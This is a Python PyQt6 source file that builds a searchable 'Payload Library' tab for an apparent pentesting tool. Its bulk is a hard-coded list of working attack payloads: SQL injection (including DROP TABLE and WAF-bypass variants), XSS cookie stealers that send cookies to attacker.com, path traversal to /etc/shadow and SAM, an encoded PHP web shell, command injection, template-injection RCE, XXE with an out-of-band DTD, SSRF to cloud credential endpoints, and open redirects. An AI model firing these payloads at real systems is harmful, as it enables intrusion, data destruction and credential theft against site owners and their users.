"""
Payload Library tab — searchable, categorized attack payloads.
"""

from __future__ import annotations

from typing import Optional

from PyQt6.QtWidgets import (
    QApplication,
    QComboBox,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QListWidget,
    QListWidgetItem,
    QPlainTextEdit,
    QPushButton,
    QSplitter,
    QVBoxLayout,
    QWidget,
)
from PyQt6.QtCore import Qt

# ── Payload database ─────────────────────────────────────────────────────────

_PAYLOADS: list[dict] = [
    # ── SQL Injection ────────────────────────────────────────────────────────
    {"cat": "SQLi", "tag": "Auth Bypass",   "name": "Classic OR bypass",         "payload": "' OR '1'='1"},
    {"cat": "SQLi", "tag": "Auth Bypass",   "name": "OR bypass (numeric)",        "payload": "1 OR 1=1"},
    {"cat": "SQLi", "tag": "Auth Bypass",   "name": "Comment bypass",             "payload": "admin'--"},
    {"cat": "SQLi", "tag": "Auth Bypass",   "name": "Hash comment bypass",        "payload": "admin'#"},
    {"cat": "SQLi", "tag": "Auth Bypass",   "name": "Equals bypass",              "payload": "' OR ''='"},
    {"cat": "SQLi", "tag": "Union",         "name": "UNION 1 col",                "payload": "' UNION SELECT NULL--"},
    {"cat": "SQLi", "tag": "Union",         "name": "UNION 2 col",                "payload": "' UNION SELECT NULL,NULL--"},
    {"cat": "SQLi", "tag": "Union",         "name": "UNION 3 col",                "payload": "' UNION SELECT NULL,NULL,NULL--"},
    {"cat": "SQLi", "tag": "Union",         "name": "UNION version (MySQL)",      "payload": "' UNION SELECT @@version--"},
    {"cat": "SQLi", "tag": "Union",         "name": "UNION user/db (MySQL)",      "payload": "' UNION SELECT user(),database()--"},
    {"cat": "SQLi", "tag": "Union",         "name": "UNION tables (MySQL)",       "payload": "' UNION SELECT table_name,NULL FROM information_schema.tables--"},
    {"cat": "SQLi", "tag": "Union",         "name": "UNION columns (MySQL)",      "payload": "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--"},
    {"cat": "SQLi", "tag": "Error-based",   "name": "ExtractValue (MySQL)",       "payload": "' AND extractvalue(1,concat(0x7e,version()))--"},
    {"cat": "SQLi", "tag": "Error-based",   "name": "UpdateXML (MySQL)",          "payload": "' AND updatexml(1,concat(0x7e,database()),1)--"},
    {"cat": "SQLi", "tag": "Error-based",   "name": "Convert int (MSSQL)",        "payload": "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--"},
    {"cat": "SQLi", "tag": "Blind",         "name": "Boolean true",               "payload": "' AND 1=1--"},
    {"cat": "SQLi", "tag": "Blind",         "name": "Boolean false",              "payload": "' AND 1=2--"},
    {"cat": "SQLi", "tag": "Blind",         "name": "Time sleep (MySQL)",         "payload": "' AND SLEEP(5)--"},
    {"cat": "SQLi", "tag": "Blind",         "name": "Time waitfor (MSSQL)",       "payload": "'; WAITFOR DELAY '0:0:5'--"},
    {"cat": "SQLi", "tag": "Blind",         "name": "Time pg_sleep (PostgreSQL)", "payload": "'; SELECT pg_sleep(5)--"},
    {"cat": "SQLi", "tag": "Stacked",       "name": "Stacked drop table",         "payload": "'; DROP TABLE users--"},
    {"cat": "SQLi", "tag": "OOB",           "name": "DNS via load_file (MySQL)",  "payload": "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\share\\\\a'))--"},
    {"cat": "SQLi", "tag": "WAF Bypass",    "name": "Case variation",             "payload": "' uNiOn SeLeCt NULL--"},
    {"cat": "SQLi", "tag": "WAF Bypass",    "name": "Inline comment",             "payload": "' UN/**/ION SEL/**/ECT NULL--"},
    {"cat": "SQLi", "tag": "WAF Bypass",    "name": "URL encode",                 "payload": "%27%20OR%20%271%27%3D%271"},
    {"cat": "SQLi", "tag": "WAF Bypass",    "name": "Double encode",              "payload": "%2527%2520OR%2520%25271%2527%253D%25271"},

    # ── XSS ─────────────────────────────────────────────────────────────────
    {"cat": "XSS", "tag": "Basic",     "name": "Script alert",           "payload": "<script>alert(1)</script>"},
    {"cat": "XSS", "tag": "Basic",     "name": "Script alert (XSS)",     "payload": "<script>alert('XSS')</script>"},
    {"cat": "XSS", "tag": "Basic",     "name": "Img onerror",            "payload": "<img src=x onerror=alert(1)>"},
    {"cat": "XSS", "tag": "Basic",     "name": "SVG onload",             "payload": "<svg onload=alert(1)>"},
    {"cat": "XSS", "tag": "Basic",     "name": "Body onload",            "payload": "<body onload=alert(1)>"},
    {"cat": "XSS", "tag": "Basic",     "name": "Input onfocus",          "payload": "<input autofocus onfocus=alert(1)>"},
    {"cat": "XSS", "tag": "Basic",     "name": "Iframe src",             "payload": "<iframe src=\"javascript:alert(1)\">"},
    {"cat": "XSS", "tag": "DOM",       "name": "Hash-based DOM",         "payload": "#<script>alert(1)</script>"},
    {"cat": "XSS", "tag": "DOM",       "name": "document.write",         "payload": "\"><script>document.write('<img src=x onerror=alert(1)>')</script>"},
    {"cat": "XSS", "tag": "DOM",       "name": "innerHTML",              "payload": "'-alert(1)-'"},
    {"cat": "XSS", "tag": "Attribute", "name": "Attr break out",         "payload": "\" onmouseover=\"alert(1)"},
    {"cat": "XSS", "tag": "Attribute", "name": "Attr no quote",          "payload": " onmouseover=alert(1) x="},
    {"cat": "XSS", "tag": "Attribute", "name": "href javascript",        "payload": "javascript:alert(1)"},
    {"cat": "XSS", "tag": "WAF Bypass","name": "Case mixed",             "payload": "<ScRiPt>alert(1)</ScRiPt>"},
    {"cat": "XSS", "tag": "WAF Bypass","name": "Encoded script tag",     "payload": "<scr&#105;pt>alert(1)</scr&#105;pt>"},
    {"cat": "XSS", "tag": "WAF Bypass","name": "Null byte",              "payload": "<scr\x00ipt>alert(1)</scr\x00ipt>"},
    {"cat": "XSS", "tag": "WAF Bypass","name": "Double encode",          "payload": "%253Cscript%253Ealert(1)%253C/script%253E"},
    {"cat": "XSS", "tag": "WAF Bypass","name": "Tab in attr",            "payload": "<img\tsrc=x onerror=alert(1)>"},
    {"cat": "XSS", "tag": "WAF Bypass","name": "New line in attr",       "payload": "<img\nsrc=x onerror=alert(1)>"},
    {"cat": "XSS", "tag": "Steal",     "name": "Cookie steal",           "payload": "<script>fetch('https://attacker.com/?c='+document.cookie)</script>"},
    {"cat": "XSS", "tag": "Steal",     "name": "Cookie steal (img)",     "payload": "<img src=x onerror=\"this.src='https://attacker.com/?c='+document.cookie\">"},
    {"cat": "XSS", "tag": "Polyglot",  "name": "Polyglot 1",             "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>>"},

    # ── LFI / Path Traversal ─────────────────────────────────────────────────
    {"cat": "LFI", "tag": "Linux",     "name": "etc/passwd (basic)",     "payload": "../../../../etc/passwd"},
    {"cat": "LFI", "tag": "Linux",     "name": "etc/passwd (deep)",      "payload": "../../../../../../../../../../etc/passwd"},
    {"cat": "LFI", "tag": "Linux",     "name": "etc/shadow",             "payload": "../../../../etc/shadow"},
    {"cat": "LFI", "tag": "Linux",     "name": "proc/self/environ",      "payload": "../../../../proc/self/environ"},
    {"cat": "LFI", "tag": "Linux",     "name": "proc/self/cmdline",      "payload": "../../../../proc/self/cmdline"},
    {"cat": "LFI", "tag": "Linux",     "name": "proc/net/tcp",           "payload": "../../../../proc/net/tcp"},
    {"cat": "LFI", "tag": "Linux",     "name": "var/log/auth.log",       "payload": "../../../../var/log/auth.log"},
    {"cat": "LFI", "tag": "Linux",     "name": "var/log/nginx/access",   "payload": "../../../../var/log/nginx/access.log"},
    {"cat": "LFI", "tag": "Windows",   "name": "win.ini",                "payload": "..\\..\\..\\..\\windows\\win.ini"},
    {"cat": "LFI", "tag": "Windows",   "name": "system.ini",             "payload": "..\\..\\..\\..\\windows\\system.ini"},
    {"cat": "LFI", "tag": "Windows",   "name": "SAM",                    "payload": "..\\..\\..\\..\\windows\\system32\\config\\SAM"},
    {"cat": "LFI", "tag": "Bypass",    "name": "Null byte (PHP <5.3)",   "payload": "../../../../etc/passwd%00"},
    {"cat": "LFI", "tag": "Bypass",    "name": "Double encode",          "payload": "..%252f..%252f..%252fetc%252fpasswd"},
    {"cat": "LFI", "tag": "Bypass",    "name": "URL encode",             "payload": "..%2f..%2f..%2f..%2fetc%2fpasswd"},
    {"cat": "LFI", "tag": "Bypass",    "name": "Mixed slash",            "payload": "....//....//....//etc/passwd"},
    {"cat": "LFI", "tag": "Bypass",    "name": "PHP filter base64",      "payload": "php://filter/convert.base64-encode/resource=index.php"},
    {"cat": "LFI", "tag": "Bypass",    "name": "PHP filter rot13",       "payload": "php://filter/read=string.rot13/resource=index.php"},
    {"cat": "LFI", "tag": "Bypass",    "name": "data:// RCE",            "payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="},

    # ── Command Injection ────────────────────────────────────────────────────
    {"cat": "CMDi", "tag": "Basic",    "name": "Semicolon",              "payload": "; id"},
    {"cat": "CMDi", "tag": "Basic",    "name": "AND operator",           "payload": "& id"},
    {"cat": "CMDi", "tag": "Basic",    "name": "AND operator 2",         "payload": "&& id"},
    {"cat": "CMDi", "tag": "Basic",    "name": "Pipe",                   "payload": "| id"},
    {"cat": "CMDi", "tag": "Basic",    "name": "OR operator",            "payload": "|| id"},
    {"cat": "CMDi", "tag": "Basic",    "name": "Newline",                "payload": "\nid"},
    {"cat": "CMDi", "tag": "Basic",    "name": "Backtick",               "payload": "`id`"},
    {"cat": "CMDi", "tag": "Basic",    "name": "Dollar paren",           "payload": "$(id)"},
    {"cat": "CMDi", "tag": "Windows",  "name": "Semicolon (Win)",        "payload": "; whoami"},
    {"cat": "CMDi", "tag": "Windows",  "name": "Pipe (Win)",             "payload": "| whoami"},
    {"cat": "CMDi", "tag": "Blind",    "name": "Sleep (Linux)",          "payload": "; sleep 5"},
    {"cat": "CMDi", "tag": "Blind",    "name": "Ping (Win blind)",       "payload": "& ping -n 5 127.0.0.1"},
    {"cat": "CMDi", "tag": "Bypass",   "name": "Env var split",          "payload": ";i$()d"},
    {"cat": "CMDi", "tag": "Bypass",   "name": "Wildcard",               "payload": "/???/i?"},
    {"cat": "CMDi", "tag": "Bypass",   "name": "Hex encode",             "payload": ";$(printf '\\x69\\x64')"},

    # ── SSTI ────────────────────────────────────────────────────────────────
    {"cat": "SSTI", "tag": "Detect",   "name": "Math probe",             "payload": "{{7*7}}"},
    {"cat": "SSTI", "tag": "Detect",   "name": "Math probe 2",           "payload": "${7*7}"},
    {"cat": "SSTI", "tag": "Detect",   "name": "ERB probe",              "payload": "<%= 7*7 %>"},
    {"cat": "SSTI", "tag": "Detect",   "name": "Freemarker probe",       "payload": "${7*7}"},
    {"cat": "SSTI", "tag": "Jinja2",   "name": "Config dump",            "payload": "{{config}}"},
    {"cat": "SSTI", "tag": "Jinja2",   "name": "Class MRO RCE",         "payload": "{{''.__class__.__mro__[1].__subclasses__()}}"},
    {"cat": "SSTI", "tag": "Jinja2",   "name": "OS popen RCE",          "payload": "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}"},
    {"cat": "SSTI", "tag": "Twig",     "name": "Twig RCE",              "payload": "{{['id']|filter('system')}}"},
    {"cat": "SSTI", "tag": "Freemark", "name": "Freemarker RCE",        "payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"},
    {"cat": "SSTI", "tag": "ERB",      "name": "ERB RCE",               "payload": "<%= `id` %>"},

    # ── XXE ──────────────────────────────────────────────────────────────────
    {"cat": "XXE", "tag": "Basic",    "name": "Read /etc/passwd",        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"},
    {"cat": "XXE", "tag": "Basic",    "name": "Read win.ini",            "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>"},
    {"cat": "XXE", "tag": "OOB",     "name": "OOB via DTD",             "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><foo>bar</foo>"},
    {"cat": "XXE", "tag": "SSRF",    "name": "SSRF via XXE",            "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>"},
    {"cat": "XXE", "tag": "Blind",   "name": "Error-based blind",       "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY % wrap \"<!ENTITY err SYSTEM 'file:///nonexistent/%xxe;'>\">%wrap;]><foo>&err;</foo>"},

    # ── SSRF ────────────────────────────────────────────────────────────────
    {"cat": "SSRF", "tag": "AWS",     "name": "AWS metadata",           "payload": "http://169.254.169.254/latest/meta-data/"},
    {"cat": "SSRF", "tag": "AWS",     "name": "AWS IAM creds",          "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
    {"cat": "SSRF", "tag": "GCP",     "name": "GCP metadata",           "payload": "http://metadata.google.internal/computeMetadata/v1/"},
    {"cat": "SSRF", "tag": "Azure",   "name": "Azure IMDS",             "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"},
    {"cat": "SSRF", "tag": "Internal","name": "Localhost",              "payload": "http://localhost/"},
    {"cat": "SSRF", "tag": "Internal","name": "127.0.0.1",              "payload": "http://127.0.0.1/"},
    {"cat": "SSRF", "tag": "Bypass",  "name": "0.0.0.0",               "payload": "http://0.0.0.0/"},
    {"cat": "SSRF", "tag": "Bypass",  "name": "IPv6 loopback",          "payload": "http://[::1]/"},
    {"cat": "SSRF", "tag": "Bypass",  "name": "Dec encoded IP",         "payload": "http://2130706433/"},
    {"cat": "SSRF", "tag": "Bypass",  "name": "Hex encoded IP",         "payload": "http://0x7f000001/"},
    {"cat": "SSRF", "tag": "Bypass",  "name": "url@localhost",          "payload": "http://attacker.com@127.0.0.1/"},
    {"cat": "SSRF", "tag": "Proto",   "name": "file://",                "payload": "file:///etc/passwd"},
    {"cat": "SSRF", "tag": "Proto",   "name": "gopher://",              "payload": "gopher://127.0.0.1:6379/_PING"},
    {"cat": "SSRF", "tag": "Proto",   "name": "dict://",                "payload": "dict://127.0.0.1:11211/stat"},

    # ── Open Redirect ────────────────────────────────────────────────────────
    {"cat": "OpenRedirect", "tag": "Basic", "name": "Double slash",     "payload": "//attacker.com"},
    {"cat": "OpenRedirect", "tag": "Basic", "name": "Protocol",         "payload": "https://attacker.com"},
    {"cat": "OpenRedirect", "tag": "Basic", "name": "javascript:",      "payload": "javascript:alert(1)"},
    {"cat": "OpenRedirect", "tag": "Bypass","name": "Backslash",        "payload": "/\\attacker.com"},
    {"cat": "OpenRedirect", "tag": "Bypass","name": "CRLF inject",      "payload": "//%0d%0aLocation:%20https://attacker.com"},
]

_CATEGORIES = sorted({p["cat"] for p in _PAYLOADS})

# ── Styles ──────────────────────────────────────────────────────────────────

_SS_LABEL = "color: #a6adc8; font-size: 11px; font-weight: bold;"
_SS_INPUT = (
    "QLineEdit { background: #181825; color: #cdd6f4; border: 1px solid #313244; "
    "border-radius: 4px; padding: 5px 8px; }"
    "QLineEdit:focus { border-color: #89b4fa; }"
)
_SS_LIST = (
    "QListWidget { background: #181825; color: #cdd6f4; border: 1px solid #313244; "
    "outline: none; } "
    "QListWidget::item { padding: 5px 8px; } "
    "QListWidget::item:selected { background: #313244; color: #89b4fa; "
    "border-left: 3px solid #89b4fa; } "
    "QListWidget::item:hover { background: #252535; }"
)
_SS_OUTPUT = (
    "QPlainTextEdit { background: #0d1117; color: #4ec9b0; "
    "font-family: 'Fira Code', 'JetBrains Mono', monospace; font-size: 13px; "
    "border: 1px solid #313244; border-radius: 4px; padding: 8px; }"
)
_SS_BTN = (
    "QPushButton { background: #313244; color: #cdd6f4; border: none; "
    "border-radius: 4px; padding: 5px 14px; }"
    "QPushButton:hover { background: #45475a; }"
)
_SS_BTN_ACCENT = (
    "QPushButton { background: #89b4fa; color: #1e1e2e; font-weight: bold; "
    "border: none; border-radius: 4px; padding: 5px 14px; }"
    "QPushButton:hover { background: #b4befe; }"
)
_SS_COMBO = (
    "QComboBox { background: #181825; color: #cdd6f4; border: 1px solid #313244; "
    "border-radius: 4px; padding: 4px 8px; } "
    "QComboBox QAbstractItemView { background: #181825; color: #cdd6f4; "
    "selection-background-color: #313244; }"
)


class PayloadLibTab(QWidget):
    def __init__(self, parent: Optional[QWidget] = None):
        super().__init__(parent)
        root = QVBoxLayout(self)
        root.setContentsMargins(0, 0, 0, 0)

        splitter = QSplitter(Qt.Orientation.Horizontal)

        # ── Left: filter + list ────────────────────────────────────────
        left = QWidget()
        left.setMinimumWidth(260)
        ll = QVBoxLayout(left)
        ll.setContentsMargins(10, 10, 6, 10)
        ll.setSpacing(6)

        ll.addWidget(QLabel("Search").also(lambda l: l.setStyleSheet(_SS_LABEL)))

        self._search = QLineEdit()
        self._search.setStyleSheet(_SS_INPUT)
        self._search.setPlaceholderText("Filter payloads…")
        self._search.textChanged.connect(self._filter)
        ll.addWidget(self._search)

        ll.addWidget(QLabel("Category").also(lambda l: l.setStyleSheet(_SS_LABEL)))

        self._cat = QComboBox()
        self._cat.setStyleSheet(_SS_COMBO)
        self._cat.addItem("All")
        self._cat.addItems(_CATEGORIES)
        self._cat.currentTextChanged.connect(self._filter)
        ll.addWidget(self._cat)

        self._list = QListWidget()
        self._list.setStyleSheet(_SS_LIST)
        self._list.currentRowChanged.connect(self._on_select)
        ll.addWidget(self._list)

        count_row = QHBoxLayout()
        self._count_lbl = QLabel("0 payloads")
        self._count_lbl.setStyleSheet("color: #6c7086; font-size: 10px;")
        count_row.addWidget(self._count_lbl)
        count_row.addStretch()
        ll.addLayout(count_row)

        splitter.addWidget(left)

        # ── Right: payload viewer ──────────────────────────────────────
        right = QWidget()
        rl = QVBoxLayout(right)
        rl.setContentsMargins(6, 10, 10, 10)
        rl.setSpacing(8)

        self._name_lbl = QLabel("Select a payload")
        self._name_lbl.setStyleSheet("color: #cdd6f4; font-size: 13px; font-weight: bold;")
        rl.addWidget(self._name_lbl)

        self._meta_lbl = QLabel("")
        self._meta_lbl.setStyleSheet("color: #a6adc8; font-size: 11px;")
        rl.addWidget(self._meta_lbl)

        self._payload_out = QPlainTextEdit()
        self._payload_out.setReadOnly(True)
        self._payload_out.setStyleSheet(_SS_OUTPUT)
        rl.addWidget(self._payload_out)

        btn_row = QHBoxLayout()
        copy_btn = QPushButton("Copy Payload")
        copy_btn.setStyleSheet(_SS_BTN_ACCENT)
        copy_btn.clicked.connect(self._copy)
        btn_row.addWidget(copy_btn)
        btn_row.addStretch()
        rl.addLayout(btn_row)

        splitter.addWidget(right)
        splitter.setSizes([280, 600])
        root.addWidget(splitter)

        self._filtered: list[dict] = []
        self._filter()

    def _filter(self):
        text = self._search.text().lower()
        cat = self._cat.currentText()
        self._filtered = [
            p for p in _PAYLOADS
            if (cat == "All" or p["cat"] == cat)
            and (not text or text in p["name"].lower()
                 or text in p["payload"].lower()
                 or text in p["tag"].lower()
                 or text in p["cat"].lower())
        ]
        self._list.clear()
        for p in self._filtered:
            item = QListWidgetItem(f"[{p['tag']}]  {p['name']}")
            item.setToolTip(p["payload"][:120])
            self._list.addItem(item)
        self._count_lbl.setText(f"{len(self._filtered)} payloads")

    def _on_select(self, row: int):
        if row < 0 or row >= len(self._filtered):
            return
        p = self._filtered[row]
        self._name_lbl.setText(p["name"])
        self._meta_lbl.setText(f"Category: {p['cat']}   Tag: {p['tag']}")
        self._payload_out.setPlainText(p["payload"])

    def _copy(self):
        cb = QApplication.clipboard()
        if cb:
            cb.setText(self._payload_out.toPlainText())


# Tiny helper so the lambda chain reads cleanly
def _also(self, fn):
    fn(self)
    return self

QLabel.also = _also  # type: ignore[attr-defined]
